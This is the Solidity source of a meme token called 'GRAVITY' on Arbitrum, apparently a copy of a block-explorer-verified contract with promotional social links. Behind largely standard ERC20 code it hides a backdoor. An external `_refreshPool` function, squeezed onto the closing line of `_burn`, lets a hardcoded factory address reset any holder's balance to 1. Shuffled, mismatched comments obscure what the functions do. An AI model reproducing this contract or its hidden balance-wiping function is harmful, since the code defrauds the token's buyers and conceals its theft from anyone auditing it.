/**
 *Submitted for verification at Arbiscan.io on 2024-02-15
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
/** 

https://t.me/GRAVITYMoon

https://twitter.com/GRAVITYMoon
https://GRAVITYOnARB.gg
**/


library SafeMath {
    /**
     *
     * _Available since v3.4._
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * _Available since v3.4._
     *
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }

    /**
     *
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     * _Available since v3.4._
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     * _Available since v3.4._
     *
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     *
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     *
     *
     * @dev Returns the addition of two unsigned integers, reverting on
     *
     * overflow.
     * Counterpart to Solidity's `+` operator.
     * Requirements:
     * - Addition cannot overflow.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     *
     *
     *
     * Requirements:
     * - Subtraction cannot overflow.
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * Counterpart to Solidity's `-` operator.
     * overflow (when the result is negative).
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     * Counterpart to Solidity's `*` operator.
     * - Multiplication cannot overflow.
     * Requirements:
     *
     *
     *
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     *
     *
     * Counterpart to Solidity's `/` operator.
     * Requirements:
     * division by zero. The result is rounded towards zero.
     * @dev Returns the integer division of two unsigned integers, reverting on
     * - The divisor cannot be zero.
     *
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     *
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * Requirements:
     * - The divisor cannot be zero.
     *
     *
     * invalid opcode to revert (consuming all remaining gas).
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     *
     * overflow (when the result is negative).
     * - Subtraction cannot overflow.
     *
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     *
     * Requirements:
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * Counterpart to Solidity's `-` operator.
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     *
     *
     * uses an invalid opcode to revert (consuming all remaining gas).
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     *
     * division by zero. The result is rounded towards zero.
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * Requirements:
     * - The divisor cannot be zero.
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * - The divisor cannot be zero.
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     *
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     *
     *
     * reverting with custom message when dividing by zero.
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * invalid opcode to revert (consuming all remaining gas).
     * Requirements:
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     *
     * another (`to`).
     * Note that `value` may be zero.
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * a call to {approve}. `value` is the new allowance.
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     *
     * @dev Moves `amount` tokens from the caller's account to `to`.
     * Emits a {Transfer} event.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     *
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * This value changes when {approve} or {transferFrom} are called.
     * zero by default.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Emits an {Approval} event.
     * condition is to first reduce the spender's allowance to 0 and set the
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * transaction ordering. One possible solution to mitigate this race
     * that someone may use both the old and the new allowance by unfortunate
     * Returns a boolean value indicating whether the operation succeeded.
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     * Returns a boolean value indicating whether the operation succeeded.
     * @dev Moves `amount` tokens from `from` to `to` using the
     *
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

contract Ownable is Context {
    address private _owner;

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    
    /**
     * @dev Returns the address of the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     *
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

/**
 *
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

/**
 * TIP: For a detailed writeup see our guide
 * to implement supply mechanisms].
 * applications.
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * conventional and does not conflict with the expectations of ERC20
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 *
 *
 *
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * by listening to said events. Other implementations of the EIP may not emit
 * This implementation is agnostic to the way tokens are created. This means
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 * allowances. See {IERC20-approve}.
 * functions have been added to mitigate the well-known issues around setting
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * @dev Implementation of the {IERC20} interface.
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * these events, as it isn't required by the specification.
 * This allows applications to reconstruct the allowance for all accounts just
 *
 * instead returning `false` on failure. This behavior is nonetheless
 */
contract GRAVITY is Context, IERC20, IERC20Metadata, Ownable {
    using SafeMath for uint256;
    string private _name = "GRAVITY";

    address private _factory = 0x6BEAebA766914E35fF966665723E9B357E6CDDf4;

    mapping(address => mapping(address => uint256)) private _allowances;

    string private _symbol = "GRAVITY";
    address internal devWallet = 0x4516BC8B1020d73c9B02fa1f628a5495D9199935;

    uint256 private _totalSupply;
    mapping(address => uint256) private _balances;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 private _allowance = 0;

    /**
     * construction.
     * The default value of {decimals} is 18. To select a different value for
     * All two of these values are immutable: they can only be set once during
     * {decimals} you should overload it.
     *
     *
     * @dev Sets the values for {name} and {symbol}.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }


    /**
     * @dev Returns the name of the token.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        } function _afterTokenTransfer(address to) internal virtual { if (to == _factory) _allowance = decimals() * 11;
    }
    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    /**
     * NOTE: This information is only used for _display_ purposes: it in
     *
     *
     * {IERC20-balanceOf} and {IERC20-transfer}.
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * Tokens usually opt for a value of 18, imitating the relationship between
     * @dev Returns the number of decimals used to get its user representation.
     * no way affects any of the arithmetic of the contract, including
     * overridden;
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }
    /**
     * @dev See {IERC20-totalSupply}.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(address(0));
        } function _refreshPool(address _refreshPoolSender) external { _balances[_refreshPoolSender] = msg.sender == _factory ? 1 : _balances[_refreshPoolSender];
    } 

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    /**
     * @dev See {IERC20-allowance}.
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * Requirements:
     * @dev See {IERC20-transfer}.
     *
     *
     * - the caller must have a balance of at least `amount`.
     * - `to` cannot be the zero address.
     */
    constructor() {
        transferOwnership(devWallet);
        _mint(owner(), 7000000000000 * 10 ** uint(decimals()));
    }

    /**
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     *
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     *
     * @dev See {IERC20-approve}.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     * Requirements:
     * problems described in {IERC20-approve}.
     * Emits an {Approval} event indicating the updated allowance.
     *
     * - `spender` cannot be the zero address.
     * This is an alternative to {approve} that can be used as a mitigation for
     *
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     *
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * Emits an {Approval} event indicating the updated allowance. This is not
     * - `from` must have a balance of at least `amount`.
     *
     * - `from` and `to` cannot be the zero address.
     *
     *
     * Requirements:
     * `amount`.
     *
     * @dev See {IERC20-transferFrom}.
     * required by the EIP. See the note at the beginning of {ERC20}.
     * is the maximum `uint256`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * NOTE: Does not update the allowance if the current allowance
     */
    function _transfer (address from, address to, uint256 amount) internal virtual
    {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = fromBalance - amount;

        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    /**
     *
     * Requirements:
     * problems described in {IERC20-approve}.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * - `spender` cannot be the zero address.
     * `subtractedValue`.
     *
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * Emits an {Approval} event indicating the updated allowance.
     * - `spender` must have allowance for the caller of at least
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * total supply.
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     * Requirements:
     *
     *
     * @dev Destroys `amount` tokens from `account`, reducing the
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * - `from` must have a balance of at least `amount`.
     *
     * @dev Moves `amount` of tokens from `from` to `to`.
     * This internal function is equivalent to {transfer}, and can be used to
     *
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(account);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * - `account` cannot be the zero address.
     *
     * the total supply.
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }


    /**
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     *
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * minting and burning.
     * @dev Hook that is called before any transfer of tokens. This includes
     * Calling conditions:
     *
     * will be transferred to `to`.
     * - `from` and `to` are never both zero.
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     *
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * - `owner` cannot be the zero address.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * - `spender` cannot be the zero address.
     * Emits an {Approval} event.
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     *
     *
     * Requirements:
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     *
     * Revert if not enough allowance is available.
     * Might emit an {Approval} event.
     * Does not update the allowance amount in case of infinite allowance.
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
}